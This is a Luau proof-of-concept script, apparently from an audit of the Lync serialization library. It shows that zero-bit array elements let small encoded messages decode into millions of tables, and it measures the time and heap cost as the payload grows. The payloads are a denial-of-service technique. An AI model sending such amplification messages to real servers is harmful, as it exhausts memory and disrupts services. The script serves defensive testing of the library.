--!nocheck
-- v5.md §3.3 "Every count and length has a declared maximum, checked against the remaining bits
-- before allocation." Zero-bit elements (an empty record, t.int(5, 5), a one-item enum, or any
-- constant column in mode 0) make counts free, so nested arrays decode a few bytes into millions of
-- tables. Run: lune run p2_amplification.luau
local P = require("./prelude")
local Bits, Run, Ints = P.Bits, P.Run, P.Ints
local t = P.Lync.types

-- 1. The largest outer count the planner accepts for t.array(t.array({}, 65535), N), reliable.
local lo, hi = 1, 65535
while lo < hi do
	local mid = (lo + hi + 1) // 2
	if pcall(P.plan, P.Lync, t.array(t.array({}, 65535), mid)) then
		lo = mid
	else
		hi = mid - 1
	end
end
print(string.format("planner accepts t.array(t.array({}, 65535), %d): up to %d empty tables per message", lo, lo * 65535))

-- 2. A hand-built payload: outer count N (column block), counts column frame-of-reference with
-- base 65535 * 2 (zigzag of the first residual) ... simpler: build it with the encoder itself on a
-- small value set, then measure decode cost as N grows.
local function payload(codec, n)
	local inner = table.create(65535, {})
	local values = { table.create(n, inner) }
	local w = Bits.writer()
	Run.encode(w, codec, values, 1, { list = {}, index = {} }, "p.e:fire")
	return Bits.finish(w)
end

for _, n in { 4, 16, 64 } do
	local codec = P.plan(P.Lync, t.array(t.array({}, 65535), n))
	local ok, bytes = pcall(payload, codec, n)
	if not ok then
		print("encode failed", bytes)
		continue
	end
	local before = collectgarbage("count")
	local start = os.clock()
	local out = {}
	local rule = Run.decode(Bits.reader(bytes), codec, 1, {}, out)
	local elapsed = os.clock() - start
	local after = collectgarbage("count")
	print(string.format("N = %3d: %d-byte payload, rule %d, %d tables, %.0f ms, +%.0f MB heap", n, buffer.len(bytes), rule, n * 65535, elapsed * 1000, (after - before) / 1024))
	out = nil

end

-- 3. One level, no zero-width codec: t.array(t.bool(), 65535) of all-false is a constant column
-- (mode 0), so a full array costs its count and two bits.
local boolCodec = P.plan(P.Lync, t.array(t.bool(), 65535))
local w = Bits.writer()
Run.encode(w, boolCodec, { table.create(65535, false) }, 1, { list = {}, index = {} }, "p.e:fire")
local bytes = Bits.finish(w)
local start = os.clock()
local out = {}
local rule = Run.decode(Bits.reader(bytes), boolCodec, 1, {}, out)
print(string.format("t.array(t.bool(), 65535): %d-byte message, rule %d, %d booleans, %.2f ms; a 16,384 B frame holds %d such messages",
	buffer.len(bytes), rule, #out[1], (os.clock() - start) * 1000, 16384 // buffer.len(bytes)))
